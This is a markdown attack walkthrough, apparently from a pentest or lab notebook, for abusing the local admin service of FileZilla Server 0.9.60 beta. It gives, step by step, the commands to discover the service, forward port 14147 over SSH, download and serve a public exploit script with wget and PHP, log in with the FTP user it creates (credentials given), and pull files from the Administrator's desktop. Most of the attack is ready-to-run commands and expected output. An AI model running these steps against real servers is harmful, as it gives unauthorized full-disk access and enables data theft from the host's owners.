# FileZilla Server 0.9.60 beta

FileZilla Server on Windows exposes a local administration service on `127.0.0.1:14147`. If you have SSH access to the host, port forward that admin service back to your box and abuse public 0.9.60 tooling to create an FTP user with broad filesystem access.

## Discovery

```bash
nmap -sC -sV -p21,22,14147,33333,8089 TARGET
```

Look for:

```text
21/tcp open  ftp  FileZilla ftpd 0.9.60 beta
```

From a low-privileged Windows shell, confirm the admin port:

```cmd
netstat -ano | findstr /i 14147
```

Expected:

```text
TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING
```

## Port Forward Local Admin Service

```bash
ssh USER@TARGET -L 14147:127.0.0.1:14147
```

Verify locally:

```bash
netstat -antpu | grep 14147
```

Browsing or connecting directly to `http://127.0.0.1:14147` should show FileZilla's binary admin protocol and warnings such as:

```text
You appear to be behind a NAT router...
Warning: FTP over TLS is not enabled...
```

## Exploit 0.9.60 Admin Port

Public tooling:

```bash
wget https://raw.githubusercontent.com/NeoTheCapt/FilezillaExploit/refs/heads/master/FuckFilezilla_0_9_60.php
php -S 0.0.0.0:8889
```

Browse to:

```text
http://127.0.0.1:8889/FuckFilezilla_0_9_60.php
```

If the exploit succeeds, it creates an FTP user:

```text
system:wyywyy
```

Use the credentials against FTP:

```bash
ftp TARGET
# username: system
# password: wyywyy
```

The user should now have access to the root of `C:\`:

```text
drwxr-xr-x 1 ftp ftp 0 Users
drwxr-xr-x 1 ftp ftp 0 Windows
drwxr-xr-x 1 ftp ftp 0 Program Files
```

Pull high-value files directly:

```ftp
cd /Users/Administrator/Desktop
get proof.txt
```

## Useful Enumeration Around This

Installed product evidence:

```text
FileZilla Server
DisplayVersion: beta 0.9.60
InstallLocation: C:\Program Files (x86)\FileZilla Server
```

